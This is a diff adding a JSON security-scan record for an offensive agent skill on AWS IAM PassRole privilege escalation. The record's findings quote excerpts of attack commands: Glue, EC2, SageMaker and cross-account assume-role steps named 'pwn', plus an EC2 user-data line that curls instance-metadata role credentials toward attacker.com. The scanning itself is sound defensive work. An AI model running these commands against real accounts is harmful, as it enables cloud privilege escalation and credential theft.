@@ -1,0 +1,106 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~cloud~aws-iam-passrole-chain",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain",
+  "name": "aws-iam-passrole-chain",
+  "description": "AWS IAM privilege escalation via `iam:PassRole` chains — Lambda/Glue/Sagemaker/EC2/ECS PassRole to a higher-priv role, AssumeRole chains across accounts, sts:GetCallerIdentity recon, account hijack via legacy root-mfa-bypass.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "5900066a85ea8cfbe24e21c3081ba700006e726511a337bcfff45a1b6a59d29c",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 19,
+        "excerpt": "aws sts get-caller-identity                                  # who are you?",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 38,
+        "excerpt": "aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/<your-policy> --version-id v1 \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 50,
+        "excerpt": "cat > pwn.py <<'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 69,
+        "excerpt": "aws glue create-dev-endpoint --endpoint-name pwn --role-arn arn:aws:iam::ACCT:role/TARGET_ROLE",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 75,
+        "excerpt": "aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --instance-type t2.micro \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 76,
+        "excerpt": "--iam-instance-profile Name=TARGET_PROFILE --user-data \"$(printf '#!/bin/bash\\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/TARGET_R",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 81,
+        "excerpt": "aws sagemaker create-notebook-instance --notebook-instance-name pwn --instance-type ml.t2.medium \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/aws-iam-passrole-chain/SKILL.md",
+        "line": 90,
+        "excerpt": "aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCT:role/CROSSACCT_ROLE --role-session-name pwn",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 7,
+      "network": 1
+    },
+    "score": 90,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 90,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
